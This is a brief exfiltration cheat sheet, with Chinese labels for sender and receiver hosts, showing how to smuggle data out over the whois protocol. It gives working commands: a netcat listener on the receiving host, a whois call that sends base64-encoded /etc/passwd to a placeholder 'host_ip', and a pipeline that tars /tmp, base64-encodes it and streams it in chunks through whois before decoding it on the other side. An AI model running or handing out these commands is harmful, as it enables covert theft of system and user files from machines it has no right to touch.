WHOIS 接收端 Host B：

nc -vlnp 1337 | sed "s/ //g" | base64 -d   
 

发送端 Host A：

whois -h host_ip -p 1337 `cat /etc/passwd | base64`  
 

WHOIS + TAR First:


```shell
ncat -k -l -p 4444 | tee files.b64  #tee to a file so you can make sure you have it

Next

tar czf - /tmp/* | base64 | xargs -I bits timeout 0.03 whois -h host_ip -p 4444 bits  
 

Finally

cat files.b64 | tr -d '\r\n' | base64 -d | tar zxv #to get the files out

```
